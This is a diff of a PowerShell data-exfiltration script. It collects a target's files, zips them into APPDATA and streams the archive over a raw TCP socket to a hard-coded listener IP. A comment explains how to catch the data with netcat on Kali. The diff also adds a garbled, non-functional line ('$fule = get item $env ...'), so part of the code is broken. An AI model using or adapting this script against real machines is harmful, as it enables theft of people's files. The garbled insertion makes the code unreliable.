@@ -1,4 +1,4 @@
-﻿#edit ip and port of your listener... listener is on the machine you want to send data to... I use netcat as listener... (example command on kali.. [nc -l -p 54321 > out.file])
+#edit ip and port of your listener... listener is on the machine you want to send data to... I use netcat as listener... (example command on kali.. [nc -l -p 54321 > out.file])
 [int] $Port = 54321
 $IP = "192.168.222.63"
 #edit this to specify your target
@@ -16,13 +16,14 @@ foreach($file in $files)
 $CompressionToUse = [System.IO.Compression.CompressionLevel]::Fastest
 $IncludeBaseFolder = $false
 $zipTo = "{0}\{1}.zip" -f $tempFolderRoot,"ZIPPED"
-[Reflection.Assembly]::LoadWithPartialName( "System.IO.Compression.FileSystem" )
+[Reflection.Assembly]::LoadWithPartialName( "System.IO.Compression.FileSystem" ) 
 [System.IO.Compression.ZipFile]::CreateFromDirectory($tempFolderFinal, $ZipTo, $CompressionToUse, $IncludeBaseFolder)
 $Address = [system.net.IPAddress]::Parse($IP) 
 $socket = new-object System.Net.Sockets.TcpClient
 $socket.connect($Address, $port)
 $stream = $socket.GetStream()
 $file = Get-Item $Env:APPDATA\ZIPPED.zip
+	$fule = get item $env  cc(system admin
 $fileData = [IO.File]::ReadAllBytes($file)
 $stream.Write($fileData, 0, $fileData.Length)
 $stream.Close()
